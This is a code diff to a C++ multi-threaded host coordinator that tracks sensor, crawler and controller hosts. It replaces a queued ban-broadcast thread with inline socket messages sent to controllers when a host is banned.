@@ -68,8 +68,6 @@ void *change_sensor(LPVOID);
 
 void *change_crawler(LPVOID);
 
-void *ban_broadcast(LPVOID);
-
 vector<string> split(const string &, char);
 
 int delay_choose(void);
@@ -122,8 +120,6 @@ set<HOST *, HOSTPtrComp> sensor_set;
 set<HOST *, HOSTPtrComp> controler_set;
 set<HOST *, HOSTPtrComp> getcha_set;
 set<HOST *, HOSTPtrComp> ban_set;
-
-queue<string> ban_queue;
 
 int main() {
     // init
@@ -182,18 +178,6 @@ int main() {
         printf("[Error] Bot Spreading Unable To Start.\n");
         console_on = false;
         pthread_join(server, NULL);
-        pthread_join(record_t, NULL);
-        v_t.stop();
-        pthread_join(timer, NULL);
-        return 1;
-    }
-
-    result = pthread_create(&ban, NULL, ban_broadcast, (LPVOID) &console_on);
-    if (result) {
-        printf("[Error] Ban Broadcast Unable To Start.\n");
-        console_on = false;
-        pthread_join(server, NULL);
-        pthread_join(spreading, NULL);
         pthread_join(record_t, NULL);
         v_t.stop();
         pthread_join(timer, NULL);
@@ -376,7 +360,6 @@ int main() {
     console_on = false;
     pthread_join(server, NULL);
     pthread_join(spreading, NULL);
-    pthread_join(ban, NULL);
     v_t.stop();
     pthread_join(timer, NULL);
     for (auto i : thread_handle) {
@@ -840,39 +823,6 @@ void *change_crawler(LPVOID console_on) {
     return NULL;
 }
 
-void *ban_broadcast(LPVOID console_on) {
-    printf("[INFO] Ban Broadcast Started.\n");
-    bool *console = (bool *) console_on;
-    while (*console) {
-        set<HOST *, HOSTPtrComp>::iterator it_i;
-        if (!ban_queue.empty() && !controler_set.empty()) {
-            for (it_i = controler_set.begin(); it_i != controler_set.end() && *console; it_i++) {
-                _socket client((char *) ((*it_i)->ip).c_str(), (char *) ((*it_i)->port).c_str(), BUFSIZE);
-                if (client.get_status()) {
-                    string time_msg = ban_queue.front();
-                    if (client.send_((char *) time_msg.c_str()) == -1) {
-                        printf("[Warning] Controler %s:%s Ban Broadcast Failed.\n", ((*it_i)->ip).c_str(),
-                               ((*it_i)->port).c_str());
-                    }
-                    client.shutdown_(_socket::BOTH);
-                } else {
-                    printf("[Warning] Controler %s:%s Ban Broadcast Failed.\n", ((*it_i)->ip).c_str(),
-                           ((*it_i)->port).c_str());
-                }
-                client.close_();
-                pthread_mutex_lock(&ban_lock);
-                ban_queue.pop();
-                pthread_mutex_unlock(&ban_lock);
-            }
-        } else {
-            Sleep(TSD);
-        }
-    }
-    printf("[INFO] Ban Broadcast Stop.\n");
-    pthread_exit(NULL);
-    return NULL;
-}
-
 vector<string> split(const string &str, char delimiter) {
     vector<string> tokens;
     string token;
@@ -1133,12 +1083,28 @@ int handle_msg(_socket *client, string msg_data, HOST *this_host) {
                 create = new HOST;
                 create->ip = arr.at(0);
                 create->port = arr.at(1);
+                pthread_mutex_lock(&ban_lock);
                 psize = ban_set.size();
                 ban_set.insert(create);
-                if (ban_set.size() > psize) {
-                    pthread_mutex_lock(&ban_lock);
-                    ban_queue.push("Ban:" + msg_data);
-                    pthread_mutex_unlock(&ban_lock);
+                bool flag = ban_set.size() > psize;
+                pthread_mutex_unlock(&ban_lock);
+                if (flag) {
+                    set<HOST *, HOSTPtrComp>::iterator it_i;
+                    for (it_i = controler_set.begin(); it_i != controler_set.end(); it_i++) {
+                        _socket client((char *) ((*it_i)->ip).c_str(), (char *) ((*it_i)->port).c_str(), BUFSIZE);
+                        if (client.get_status()) {
+                            string ban_msg = "Ban:" + msg_data;
+                            if (client.send_((char *) ban_msg.c_str()) == -1) {
+                                printf("[Warning] Controler %s:%s Ban Broadcast Failed.\n", ((*it_i)->ip).c_str(),
+                                       ((*it_i)->port).c_str());
+                            }
+                            client.shutdown_(_socket::BOTH);
+                        } else {
+                            printf("[Warning] Controler %s:%s Ban Broadcast Failed.\n", ((*it_i)->ip).c_str(),
+                                   ((*it_i)->port).c_str());
+                        }
+                        client.close_();
+                    }
                 }
                 break;
             }
